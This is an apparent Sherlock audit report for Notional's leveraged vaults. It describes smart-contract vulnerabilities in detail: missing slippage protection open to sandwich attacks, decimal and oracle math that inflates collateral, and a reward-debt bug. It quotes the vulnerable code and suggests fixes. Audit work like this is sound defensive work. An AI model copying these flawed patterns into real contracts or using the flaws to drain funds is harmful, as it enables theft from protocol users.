# Issue H-1: Selling sUSDe is vulnerable to sandwich attack when staked token is DAI 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/18 

## Found by 
0xrobsol, Ironsidesec, TopStar, ZeroTrust, aman, blackhole, chaduke, denzi\_, lemonmon, yotov721
## Summary
The protocol has functionality that makes a trade in 2 parts (legs). It only has slippage protection in the second part, but the second part is only executed in certain conditions, leaving the trade without slippage protection. 

## Vulnerability Detail
The protocol offers users the functionality to leverage stake and receive leveraged yield. This can be achieved by a **borrowed** token being wrapped or exchanged into a staking token that is pegged to the borrow token’s value.

Note that the user may instead deposit the borrow token directly.

One of the tokens Notional uses is Ethena's `USDe` and `sUSDe`. The user would be receiving leveraged `USDe` yield. In the case of Ethena/Notional the borrowed token is DAI.

Once a user wants to exit `BaseStakingVault::_redeemFromNotional` is called. There are two options instant redemption or through the withdraw request functionality. If instant redemption is used `EthenaLib::_sellStakedUSDe` is called.
```javascript
    function _executeInstantRedemption(
        address /* account */,
        uint256 vaultShares,
        uint256 /* maturity */,
        RedeemParams memory params
    ) internal override returns (uint256 borrowedCurrencyAmount) {
        uint256 sUSDeToSell = getStakingTokensForVaultShare(vaultShares);

        // Selling sUSDe requires special handling since most of the liquidity
        // sits inside a sUSDe/sDAI pool on Curve.
        return EthenaLib._sellStakedUSDe(
            sUSDeToSell, BORROW_TOKEN, params.minPurchaseAmount, params.exchangeData, params.dexId
        );
    }
```

The `_sellStakedUSDe` function has two trades. The first one swapping from `sUSDe` to `sDAI`. The second is only executed if the borrow token is NOT `DAI` as seen in the code snippet bellow.

<details>

```javascript
    function _sellStakedUSDe(
        uint256 sUSDeAmount,
        address borrowToken,
        uint256 minPurchaseAmount,
        bytes memory exchangeData,
        uint16 dexId
    ) internal returns (uint256 borrowedCurrencyAmount) {
        Trade memory sDAITrade = Trade({
            tradeType: TradeType.EXACT_IN_SINGLE,
            sellToken: address(sUSDe),
            buyToken: address(sDAI),
            amount: sUSDeAmount,
            limit: 0, // NOTE: no slippage guard is set here, it is enforced in the second leg
                      // of the trade.
            deadline: block.timestamp,
            exchangeData: abi.encode(CurveV2Adapter.CurveV2SingleData({
                pool: 0x167478921b907422F8E88B43C4Af2B8BEa278d3A,
                fromIndex: 1, // sUSDe
                toIndex: 0 // sDAI
            }))
        });


        (/* */, uint256 sDAIAmount) = sDAITrade._executeTrade(uint16(DexId.CURVE_V2));


        // Unwraps the sDAI to DAI
        uint256 daiAmount = sDAI.redeem(sDAIAmount, address(this), address(this));
        
=>      if (borrowToken != address(DAI)) {
            Trade memory trade = Trade({
                tradeType: TradeType.EXACT_IN_SINGLE,
                sellToken: address(DAI),
                buyToken: borrowToken,
                amount: daiAmount,
                limit: minPurchaseAmount,
                deadline: block.timestamp,
                exchangeData: exchangeData
            });


            // Trades the unwrapped DAI back to the given token.
            (/* */, borrowedCurrencyAmount) = trade._executeTrade(dexId);
        } else {
            borrowedCurrencyAmount = daiAmount;
        }
    }
``` 

</details>

There is NO slippage protection on the first trade. The reason being that slippage is checked in the second trade. 
However the second trade is only executed in the borrow token is NOT `DAI`. This opens the possibility of the trade being sandwich attacked by MEV bots stealing large portions of user funds, if the borrowed token is DAI, because the second trade would NOT be executed. Hence no slippage at all would be enforced in the transaction. 

## Impact
Loss of funds due to sandwich attack 

## Code Snippet
https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/staking/protocols/Ethena.sol#L124-L167

## Tool used
Manual Review

## Recommendation
Add a slippage parameter to the first trade as well or use the `minPurchaseAmount` parameter as a minAmountOut:
```diff
    function _sellStakedUSDe(        
        uint256 sUSDeAmount,
        address borrowToken,
        uint256 minPurchaseAmount,
        bytes memory exchangeData,
        uint16 dexId
    ) {

...

        uint256 daiAmount = sDAI.redeem(sDAIAmount, address(this), address(this));

        if (borrowToken != address(DAI)) {
            Trade memory trade = Trade({
                tradeType: TradeType.EXACT_IN_SINGLE,
                sellToken: address(DAI),
                buyToken: borrowToken,
                amount: daiAmount,
                limit: minPurchaseAmount,
                deadline: block.timestamp,
                exchangeData: exchangeData
            });

            // Trades the unwrapped DAI back to the given token.
            (/* */, borrowedCurrencyAmount) = trade._executeTrade(dexId);
        } else {
            borrowedCurrencyAmount = daiAmount;
+           require(borrowedCurrencyAmount >= minPurchaseAmount, "NotEnoughtAmountOut");
        }
    }
```

# Issue H-2: Incorrect valuation of vault share 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/60 

## Found by 
blackhole, nirohgo, xiaoming90
## Summary

The code for computing the valuation of the vault shares was found to be incorrect. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, draining assets from the protocol.

## Vulnerability Detail

Let $BT$ be the borrowed token with 6 decimal precision, and $RT$ be the redemption token with 18 decimal precision.

When a withdraw request has split and is finalized, the following `_getValueOfSplitFinalizedWithdrawRequest` function will be used to calculate the value of a withdraw request in terms of the borrowed token ($BT$).

In Line 77 below, the `Deployments.TRADING_MODULE.getOraclePrice` function will be called to fetch the exchange rate of the redemption token ($RT$) and borrowed token ($BT$).

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L77

```solidity
File: WithdrawRequestBase.sol
65:     function _getValueOfSplitFinalizedWithdrawRequest(
66:         WithdrawRequest memory w,
67:         SplitWithdrawRequest memory s,
68:         address borrowToken,
69:         address redeemToken
70:     ) internal virtual view returns (uint256) {
71:         // If the borrow token and the withdraw token match, then there is no need to apply
72:         // an exchange rate at this point.
73:         if (borrowToken == redeemToken) {
74:             return (s.totalWithdraw * w.vaultShares) / s.totalVaultShares;
75:         } else {
76:             // Otherwise, apply the proper exchange rate
77:             (int256 rate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(redeemToken, borrowToken);
78: 
79:             return (s.totalWithdraw * rate.toUint() * w.vaultShares) / 
80:                 (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION);
81:         }
82:     }
```

Within the `Deployments.TRADING_MODULE.getOraclePrice` function, chainlink oracle will be used. Refer to the source code's comment on Lines 255-257 below for more details. Note that the $RT$ is the base, while the $BT$ is the quote here.

Assume that one $BT$ is worth 1 USD, so the `quotePrice` will be 1e8. Assume that one $RT$ is worth 10 USD, so the `basePrice` will be 10e18. Note that Chainlink oracle's price is always denominated in 8 decimals for USD price feed.

This function will always return the exchange rate is `RATE_DECIMALS` (18 decimals - Hardcoded). Thus, based on the calculation in Lines 283-285, the exchange rate returned will be 10e18, which is equivalent to one unit of $RT$ is worth 10 units of $BT$.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/trading/TradingModule.sol#L283

```solidity
File: TradingModule.sol
255:     /// @notice Returns the Chainlink oracle price between the baseToken and the quoteToken, the
256:     /// Chainlink oracles. The quote currency between the oracles must match or the conversion
257:     /// in this method does not work. Most Chainlink oracles are baseToken/USD pairs.
258:     /// @param baseToken address of the first token in the pair, i.e. USDC in USDC/DAI
259:     /// @param quoteToken address of the second token in the pair, i.e. DAI in USDC/DAI
260:     /// @return answer exchange rate in rate decimals
261:     /// @return decimals number of decimals in the rate, currently hardcoded to 1e18
262:     function getOraclePrice(address baseToken, address quoteToken)
263:         public
264:         view
265:         override
266:         returns (int256 answer, int256 decimals)
267:     {
268:         _checkSequencer();
269:         PriceOracle memory baseOracle = priceOracles[baseToken];
270:         PriceOracle memory quoteOracle = priceOracles[quoteToken];
271: 
272:         int256 baseDecimals = int256(10**baseOracle.rateDecimals);
273:         int256 quoteDecimals = int256(10**quoteOracle.rateDecimals);
274: 
275:         (/* */, int256 basePrice, /* */, uint256 bpUpdatedAt, /* */) = baseOracle.oracle.latestRoundData();
276:         require(block.timestamp - bpUpdatedAt <= maxOracleFreshnessInSeconds);
277:         require(basePrice > 0); /// @dev: Chainlink Rate Error
278: 
279:         (/* */, int256 quotePrice, /* */, uint256 qpUpdatedAt, /* */) = quoteOracle.oracle.latestRoundData();
280:         require(block.timestamp - qpUpdatedAt <= maxOracleFreshnessInSeconds);
281:         require(quotePrice > 0); /// @dev: Chainlink Rate Error
282: 
283:         answer =
284:             (basePrice * quoteDecimals * RATE_DECIMALS) / 
285:             (quotePrice * baseDecimals);
286:         decimals = RATE_DECIMALS;
287:     }
```

The `rate` at Line 77 below will be 10e18 based on our earlier calculation. Note the following:

- `s.totalWithdraw` is the total $RT$ claimed and is denominated in 18 decimals (Token's native precision). Assume that `s.totalWithdraw=100e18 RT` was claimed.
- `w.vaultShares` and `s.totalVaultShares` are the number of vault shares and is denominated in 8 decimals (`INTERNAL_TOKEN_PRECISION`). Assume that `w.vaultShares=5e8` and `s.totalVaultShares=10e8`
- `Constants.EXCHANGE_RATE_PRECISION` is 1e18

Intuitively, the split's total withdraw (`s.totalWithdraw`) is 100 units of $RT$. In terms of the borrowed token ($BT$), it will be 1000 units of $BT$ since the price is (1:10). Since the withdraw request owns 50% of the vault shares in the split withdraw request, it is entitled to 500 units of $BT$.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L77

```solidity
File: WithdrawRequestBase.sol
65:     function _getValueOfSplitFinalizedWithdrawRequest(
66:         WithdrawRequest memory w,
67:         SplitWithdrawRequest memory s,
68:         address borrowToken,
69:         address redeemToken
70:     ) internal virtual view returns (uint256) {
71:         // If the borrow token and the withdraw token match, then there is no need to apply
72:         // an exchange rate at this point.
73:         if (borrowToken == redeemToken) {
74:             return (s.totalWithdraw * w.vaultShares) / s.totalVaultShares;
75:         } else {
76:             // Otherwise, apply the proper exchange rate
77:             (int256 rate, /* */) = Deployments.TRADING_MODULE.getOraclePrice(redeemToken, borrowToken);
78: 
79:             return (s.totalWithdraw * rate.toUint() * w.vaultShares) / 
80:                 (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION);
81:         }
82:     }
```

To calculate the value of a withdraw request in terms of the borrowed token ($BT$), the following formula at Line 79 above will be used:

```solidity
(s.totalWithdraw * rate * w.vaultShares) / (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION)
(100e18 * 10e18 * 5e8) / (10e8 * 1e18)
500000000000000000000
500000000000000e6
```

However, the code above indicates that the withdraw request is entitled to 500000000000000 units of $BT$ instead of 500 units of $BT$, which is overly inflated. As a result, the account's collateral will be overly inflated.

## Impact

The account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.

## Code Snippet

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/common/WithdrawRequestBase.sol#L77

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/trading/TradingModule.sol#L283

## Tool used

Manual Review

## Recommendation

Update the formula to as follows:

```diff
- (s.totalWithdraw * rate.toUint() * w.vaultShares) / (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION);
+ (s.totalWithdraw * rate.toUint() * w.vaultShares * BORROW_PRECISION) / (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION * REDEMPTION_PRECISION);
```

`BORROW_PRECISION` = 1e6 and `REDEMPTION_PRECISION` = 1e18.

Let's redo the calculation to verify that the new formula works as intended:

```solidity
(s.totalWithdraw * rate.toUint() * w.vaultShares * BORROW_PRECISION) / (s.totalVaultShares * Constants.EXCHANGE_RATE_PRECISION * REDEMPTION_PRECISION);
(100e18 * 10e18 * 5e8 * 1e6) / (10e8 * 1e18 * 1e18)
500000000
500e6
```

The new formula returned  500 units of $BT$, which is correct.

# Issue H-3: Wrong decimal precision resulted in the price being inflated 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/66 

## Found by 
nirohgo, xiaoming90
## Summary

The wrong decimal precision inflated the price returned from the oracle. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.

## Vulnerability Detail

When Notional's `PendlePTOracle` is deployed, the `ptDecimals` is set to the decimals of the PT token, as shown below.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L58

```solidity
File: PendlePTOracle.sol
32:     constructor (
..SNIP..
50:         uint8 _baseDecimals = baseToUSDOracle_.decimals();
51:         (/* */, address pt, /* */) = IPMarket(pendleMarket_).readTokens();
52:         uint8 _ptDecimals = IERC20(pt).decimals();
..SNIP..
57:         baseToUSDDecimals = int256(10**_baseDecimals);
58:         ptDecimals = int256(10**_ptDecimals);
```

The `_getPTRate` function below will return:

- If `useSyOracleRate` is true, the Pendle's `getPtToSyRate` function will be called to return how many SY tokens one unit of PT is worth
- If `useSyOracleRate` is false,  the Pendle's `getPtToAssetRate` function will be called to return how many underlying asset tokens one unit of PT is worth

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L85

```solidity
File: PendlePTOracle.sol
85:     function _getPTRate() internal view returns (int256) {
86:         uint256 ptRate = useSyOracleRate ? 
87:             Deployments.PENDLE_ORACLE.getPtToSyRate(pendleMarket, twapDuration) :
88:             Deployments.PENDLE_ORACLE.getPtToAssetRate(pendleMarket, twapDuration);
89:         return ptRate.toInt();
90:     }
```

Using PT fUSDC 26DEC2024 as an example to illustrate the issue. Note that this issue will also occur on other PTs due to wrong math.

Assume that the `PendlePTOracle` provides the price of PT fUSDC 26DEC2024. For PT fUSDC 26DEC2024, the details are as follows:

> [YT fUSDC 26DEC2024 (YT-fUSDC-...)](https://etherscan.io/token/0x5935cEdD7D33a32cD60e0F97cFf54A6Bbdbe7Eee) = 6 decimals
>
> [PT fUSDC 26DEC2024 (PT-fUSDC-...)](https://etherscan.io/token/0xd187bea2c423d908d102ebe5ee8c65d37f4085c3) = 6 decimals
>
> [SY fUSDC (SY-fUSDC)](https://etherscan.io/token/0xf94A3798B18140b9Bc322314bbD36BC8e245E29B) = 8 decimals
>
> Underlying Asset = [Flux USDC (fUSDC)](https://etherscan.io/token/0x465a5a630482f3abd6d3b84b39b29b07214d19e5) = 8 decimals
>
> Market = 0xcb71c2a73fd7588e1599df90b88de2316585a860
>
> Pendle's Market Page: https://app.pendle.finance/trade/markets/0xcb71c2a73fd7588e1599df90b88de2316585a860/swap?view=pt&chain=ethereum&py=output

In this case, the `ptDecimals` will be 1e6. The `rateDecimals` is always hardcoded to `1e18`.

Assume that the `baseToUSD` provides the price of fUSDC in terms of US dollars, and `baseToUSDDecimals` is 1e8. The price returned is `99990557`, close to 1 US Dollar (USD).

Assume that `useSyOracleRate` is set to `False`, the Pendle's `getPtToAssetRate` function will be called, and the price (`ptRate`) returned will be `978197897539187120`, as shown below.

https://etherscan.io/address/0x9a9fa8338dd5e5b2188006f1cd2ef26d921650c2#readProxyContract

<img width="325" alt="image-2024070225519056 PM" src="https://github.com/sherlock-audit/2024-06-leveraged-vaults-xiaoming9090/assets/102820284/93cc94d4-c54c-47d0-95ef-993a8a41e231">

The above-returned price (`978197897539187120`) is in 18 decimals. This means 1 PT is worth around 1 fUSDC (`978197897539187120 / 1e18`), which makes sense.

However, based on the formula at Line 117 below, the price of the PT fUSDC 26DEC2024 will be `9.781055263e29`, which is incorrect and is an extremely large number (inflated by 12 orders of magnitude). This is far from the intended price of PT fUSDC 26DEC2024, which should hover around 1 USD.

```solidity
answer = (ptRate * baseToUSD * rateDecimals) /(baseToUSDDecimals * ptDecimals)
answer = (978197897539187120 * baseToUSD * rateDecimals) /(baseToUSDDecimals * 1e6)
answer = (978197897539187120 * 99990557 * rateDecimals) /(1e8 * 1e6)
answer = (978197897539187120 * 99990557 * 1e18) /(1e8 * 1e6)
answer = 9.781055263e29
```

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L117

```solidity
File: PendlePTOracle.sol
092:     function _calculateBaseToQuote() internal view returns (
093:         uint80 roundId,
094:         int256 answer,
095:         uint256 startedAt,
096:         uint256 updatedAt,
097:         uint80 answeredInRound
098:     ) {
099:         _checkSequencer();
100: 
101:         int256 baseToUSD;
102:         (
103:             roundId,
104:             baseToUSD,
105:             startedAt,
106:             updatedAt,
107:             answeredInRound
108:         ) = baseToUSDOracle.latestRoundData();
109:         require(baseToUSD > 0, "Chainlink Rate Error");
110:         // Overflow and div by zero not possible
111:         if (invertBase) baseToUSD = (baseToUSDDecimals * baseToUSDDecimals) / baseToUSD;
112: 
113:         // Past expiration, hardcode the PT oracle price to 1. It is no longer tradable and
114:         // is worth 1 unit of the underlying SY at expiration.
115:         int256 ptRate = expiry <= block.timestamp ? ptDecimals : _getPTRate();
116: 
117:         answer = (ptRate * baseToUSD * rateDecimals) /
118:             (baseToUSDDecimals * ptDecimals);
119:     }
```

The root cause is that the code wrongly assumes that the price returned from Pendle's `getPtToAssetRate` function is denominated in PT's decimals. However, it is, in fact, denominated in 18 decimals. Thus, when the PT is not 18 decimals, such as the one in our example (6 decimals), the price returned from Notional's `PendlePTOracle` will be overly inflated.

## Impact

The price returned from the Notional's `PendlePTOracle` contract will be inflated. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.

## Code Snippet

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L58

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L85

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L117

## Tool used

Manual Review

## Recommendation

Update the formula to ensure that the PT rate is divided by the rate decimals of Pendle's PT Oracle.

# Issue H-4: Incorrect assumption that PT rate is 1.0 post-expiry 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/69 

## Found by 
lemonmon, xiaoming90
## Summary

PT rate will be hardcoded to 1.0 post-expiry, which is incorrect. The price returned from the Notional's `PendlePTOracle` contract will be inflated. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.

## Vulnerability Detail

The following are the configuration files for the PT weETH 27JUN2024 taken from the test files of the audit contest's repository. 

For PT weETH 27JUN2024, note that the `useSyOracleRate` is set to `True`, as per Line 59 below.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/tests/Staking/PendlePTTests.yml#L51

```solidity
File: PendlePTTests.yml
51:   - stakeSymbol: weETH
52:     forkBlock: 221089505
53:     expiry: 27JUN2024
54:     primaryBorrowCurrency: ETH
55:     contractName: PendlePTGeneric
56:     oracles: [ETH]
57:     marketAddress: "0x952083cde7aaa11AB8449057F7de23A970AA8472"
58:     ptAddress: "0x1c27Ad8a19Ba026ADaBD615F6Bc77158130cfBE4"
59:     useSyOracleRate: 'true'
60:     tradeOnEntry: true
61:     primaryDex: UniswapV3
```

For PT weETH 27JUN2024, note that the `useSyOracleRate` is set to `True`, as per Line 118 below.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/tests/generated/arbitrum/PendlePT_weETH_ETH.t.sol#L115

```solidity
 File: PendlePT_weETH_ETH.t.sol
115:         marketAddress = 0x952083cde7aaa11AB8449057F7de23A970AA8472;
116:         ptAddress = 0x1c27Ad8a19Ba026ADaBD615F6Bc77158130cfBE4;
117:         twapDuration = 15 minutes; // recommended 15 - 30 min
118:         useSyOracleRate = true;
119:         baseToUSDOracle = 0x9414609789C179e1295E9a0559d629bF832b3c04;
120:         
121:         tokenInSy = 0x35751007a407ca6FEFfE80b3cB397736D2cf4dbe;
122:         borrowToken = 0x0000000000000000000000000000000000000000;
123:         tokenOutSy = 0x35751007a407ca6FEFfE80b3cB397736D2cf4dbe;
124:         redemptionToken = 0x35751007a407ca6FEFfE80b3cB397736D2cf4dbe;
```

In this case, the `useSyOracleRate` is set to `True` in the `PendlePTOracle` contract.

In Line 115 below, the PT rate will be hardcoded to 1.0 post-expiry. Per the comment at Lines 113-114, it assumes that 1 unit of PT is worth 1 unit of the underlying SY at expiration. However, this assumption is incorrect.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L113

```solidity
File: PendlePTOracle.sol
092:     function _calculateBaseToQuote() internal view returns (
..SNIP..
113:         // Past expiration, hardcode the PT oracle price to 1. It is no longer tradable and
114:         // is worth 1 unit of the underlying SY at expiration.
115:         int256 ptRate = expiry <= block.timestamp ? ptDecimals : _getPTRate();
116: 
117:         answer = (ptRate * baseToUSD * rateDecimals) /
118:             (baseToUSDDecimals * ptDecimals);
119:     }
```

Per the [Pendle documentation](https://docs.pendle.finance/ProtocolMechanics/YieldTokenization/PT7):

> In the case of reward-bearing assets, it’s particularly important to note that PT is redeemable 1:1 for the accounting asset, *NOT* the **underlying asset.
>
> For example, the value of Renzo ezETH increases overtime relative to ETH as staking and restaking rewards are accrued. For every 1 PT-ezETH you own, you’ll be able to redeem 1 ETH worth of ezETH upon maturity, *NOT* 1 ezETH which has a higher value**.**

Using PT weETH 27JUN2024, which is used within the ether.fi vault as an example:

- Underlying assets = [weETH](https://arbiscan.io/address/0x35751007a407ca6feffe80b3cb397736d2cf4dbe) (Wrapped eETH)
- SY = [SY weETH](https://arbiscan.io/address/0xa6c895eb332e91c5b3d00b7baeeaae478cc502da)
- PT = [PT weETH 27JUN2024](https://arbiscan.io/address/0x1c27ad8a19ba026adabd615f6bc77158130cfbe4)
- Market = https://arbiscan.io/address/0x952083cde7aaa11AB8449057F7de23A970AA8472 (isExpired = true)
- Accounting assets = eETH = ETH

Per the [Pendle's eETH market page](https://app.pendle.finance/trade/markets/0xf9f9779d8ff604732eba9ad345e6a27ef5c2a9d6/swap?view=pt&chain=arbitrum&py=output), it has stated that 1 PT eETH is equal to 1 eETH (also equal to 1 ETH) at maturity.

<img width="458" alt="image-2024070193926709 PM" src="https://github.com/sherlock-audit/2024-06-leveraged-vaults-xiaoming9090/assets/102820284/398f979c-3936-4a03-a970-281c53981e39">

However, as noted earlier, the code assumes that one unit of PT is worth one unit of weETH instead of one unit of PT being worth one unit of eETH, which is incorrect.

On 1 July, the price of weETH was 3590 USD, while the price of eETH was 3438 USD. This is a difference of 152 USD.

As a result, the price returned from the Notional's `PendlePTOracle` contract will be inflated.

#### Additional Information

The PT weETH 27JUN2024 has already expired as of 1 July 2024.

Let's verify if the PT rate is 1.0 after maturity by inspecting the rate returned from Pendle [PT Oracle](https://arbiscan.io/address/0x9a9Fa8338dd5E5B2188006f1Cd2Ef26d921650C2)'s `getPtToSyRate` function.

<img width="318" alt="image-2024070195459431 PM" src="https://github.com/sherlock-audit/2024-06-leveraged-vaults-xiaoming9090/assets/102820284/630d7ca4-f9b3-433f-a44c-70c41fa65c38">

As shown above, the PT rate at maturity is `0.9598002817` instead of `1.0`. Thus, it is incorrect to assume that the PT rate is 1.0 post-expiry.

## Impact

The price returned from the Notional's `PendlePTOracle` contract will be inflated. As a result, the account's collateral will be overinflated, allowing malicious users to borrow significantly more than the actual collateral value, stealing assets from the protocol.

## Code Snippet

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/oracles/PendlePTOracle.sol#L113

## Tool used

Manual Review

## Recommendation

Ensure that the correct PT rate is used post-expiry.

# Issue H-5: Lack of slippage control on `_redeemPT` function 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/70 

## Found by 
BiasedMerc, Ironsidesec, ZeroTrust, blackhole, brgltd, denzi\_, lemonmon, pseudoArtist, xiaoming90
## Summary

The slippage control on the `_redeemPT` function has been disabled. As a result, it can lead to a loss of assets. Slippage can occur naturally due to on-chain trading activities or the victim being sandwiched by malicious users/MEV.

## Vulnerability Detail

In Line 137 of the `_redeemPT` function, the `minTokenOut` is set to `0`, which disables the slippage control. Note that redeeming one `TOKEN_OUT_SY` does not always give you one `netTokenOut`. Not all SY contracts will burn one share and return 1 yield token back. Inspecting the Pendle's source code will reveal that for some SY contracts, some redemption will involve withdrawing/redemption from external staking protocol or performing some swaps, which might suffer from some slippage.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L137

```solidity
File: PendlePrincipalToken.sol
123:     /// @notice Handles PT redemption whether it is expired or not
124:     function _redeemPT(uint256 vaultShares) internal returns (uint256 netTokenOut) {
125:         uint256 netPtIn = getStakingTokensForVaultShare(vaultShares);
126:         uint256 netSyOut;
127: 
128:         // PT tokens are known to be ERC20 compatible
129:         if (PT.isExpired()) {
130:             PT.transfer(address(YT), netPtIn);
131:             netSyOut = YT.redeemPY(address(SY));
132:         } else {
133:             PT.transfer(address(MARKET), netPtIn);
134:             (netSyOut, ) = MARKET.swapExactPtForSy(address(SY), netPtIn, "");
135:         }
136: 
137:         netTokenOut = SY.redeem(address(this), netSyOut, TOKEN_OUT_SY, 0, true);
138:     }
```

The `_redeemPT` function is being used in two places:

#### Instance 1 - Within `_executeInstantRedemption` function

If `TOKEN_OUT_SY == BORROW_TOKEN`, the code will accept any `netTokenOut` redeemed, even if it is fewer than expected due to slippage.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L140

```solidity
File: PendlePrincipalToken.sol
140:     function _executeInstantRedemption(
141:         address /* account */,
142:         uint256 vaultShares,
143:         uint256 /* maturity */,
144:         RedeemParams memory params
145:     ) internal override returns (uint256 borrowedCurrencyAmount) {
146:         uint256 netTokenOut = _redeemPT(vaultShares);
147: 
148:         if (TOKEN_OUT_SY != BORROW_TOKEN) {
149:             Trade memory trade = Trade({
150:                 tradeType: TradeType.EXACT_IN_SINGLE,
151:                 sellToken: TOKEN_OUT_SY,
152:                 buyToken: BORROW_TOKEN,
153:                 amount: netTokenOut,
154:                 limit: params.minPurchaseAmount,
155:                 deadline: block.timestamp,
156:                 exchangeData: params.exchangeData
157:             });
158: 
159:             // Executes a trade on the given Dex, the vault must have permissions set for
160:             // each dex and token it wants to sell.
161:             (/* */, borrowedCurrencyAmount) = _executeTrade(params.dexId, trade);
162:         } else {
163:             borrowedCurrencyAmount = netTokenOut;
164:         }
```

#### Instance 2 - Within `_initiateWithdrawImpl` function

The code will accept any `tokenOutSy` redeemed, even if it is fewer than expected due to slippage, and proceed to withdraw them from external protocols.

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L171

```solidity
File: PendlePrincipalToken.sol
171:     function _initiateWithdrawImpl(
172:         address account, uint256 vaultSharesToRedeem, bool isForced
173:     ) internal override returns (uint256 requestId) {
174:         // When doing a direct withdraw for PTs, we first redeem or trade out of the PT
175:         // and then initiate a withdraw on the TOKEN_OUT_SY. Since the vault shares are
176:         // stored in PT terms, we pass tokenOutSy terms (i.e. weETH or sUSDe) to the withdraw
177:         // implementation.
178:         uint256 tokenOutSy = _redeemPT(vaultSharesToRedeem);
179:         requestId = _initiateSYWithdraw(account, tokenOutSy, isForced);
180:         // Store the tokenOutSy here for later when we do a valuation check against the position
181:         VaultStorage.getWithdrawRequestData()[requestId] = abi.encode(tokenOutSy);
182:     }
```

## Impact

Loss of assets due to lack of slippage control. Slippage can occur naturally due to on-chain trading activities or the victim being sandwiched by malicious users/MEV.

## Code Snippet

https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/main/leveraged-vaults-private/contracts/vaults/staking/protocols/PendlePrincipalToken.sol#L137

## Tool used

Manual Review

## Recommendation

Consider implementing the required slippage control.

# Issue M-1: _claimRewardToken() will update accountRewardDebt even when there is a failure during reward claiming, as a result, a user might lose rewards. 

Source: https://github.com/sherlock-audit/2024-06-leveraged-vaults-judging/issues/1 

## Found by 
BiasedMerc, ZeroTrust, chaduke, eeyore, nirohgo, xiaoming90
## Summary
`` _claimRewardToken()`` will update accountRewardDebt even when there is a failure during reward claiming, for example, when there is a lack of balances or a temporary blacklist that prevents an account from receiving tokens for the moment. As a result, a user might lose rewards.

## Vulnerability Detail

_claimRewardToken() will be called when a user needs to claim rewards, for example, via 
claimAccountRewards() -> _claimAccountRewards() -> _claimRewardToken().

However, the problem is that `` _claimRewardToken()`` will update accountRewardDebt even when there is a failure during reward claiming, for example, when there is a lack of balances or a temporary blacklist that prevents an account from receiving tokens for the moment. 

[https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L295-L328](https://github.com/sherlock-audit/2024-06-leveraged-vaults/blob/14d3eaf0445c251c52c86ce88a84a3f5b9dfad94/leveraged-vaults-private/contracts/vaults/common/VaultRewarderLib.sol#L295-L328)

The following code will be executed to update ``accountRewardDebt``:

```javascript
 VaultStorage.getAccountRewardDebt()[rewardToken][account] = (
            (vaultSharesAfter * rewardsPerVaultShare) /
                uint256(Constants.INTERNAL_TOKEN_PRECISION)
        );
```

Meanwhile, the try-catch block will succeed without reverting even there is a failure: for example, when there is a lack of balances or a temporary blacklist that prevents an account from receiving tokens for the moment. 

As a result, a user will lost rewards since  ``accountRewardDebt`` has been updated even though he has not received the rewards. 

## Impact
 _claimRewardToken() will update accountRewardDebt even when there is a failure during reward claiming, as a result, a user might lose rewards.


## Code Snippet


## Tool used
Manual reading and foundry

Manual Review

## Recommendation
We should only update ``accountRewardDebt`` when the claim is successful. 

```diff
